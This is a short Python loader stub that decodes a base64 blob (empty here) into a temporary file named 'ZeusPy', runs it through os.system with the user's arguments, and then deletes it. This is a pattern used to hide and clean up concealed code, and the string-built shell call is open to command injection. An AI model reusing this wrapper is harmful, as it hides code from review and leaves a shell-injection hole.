import base64, os, sys, time
gecici = 'ZeusPy'
veri = ''
try:
    with open(gecici, 'wb') as dosya:
        dosya.write(base64.b64decode(veri))
    os.system('python3 ' + gecici + ' ' + ' '.join(sys.argv[1:]))
except Exception as hata:
    print(f"Hata: {hata}")
finally:
    time.sleep(1)
    if os.path.exists(gecici):
        os.remove(gecici)
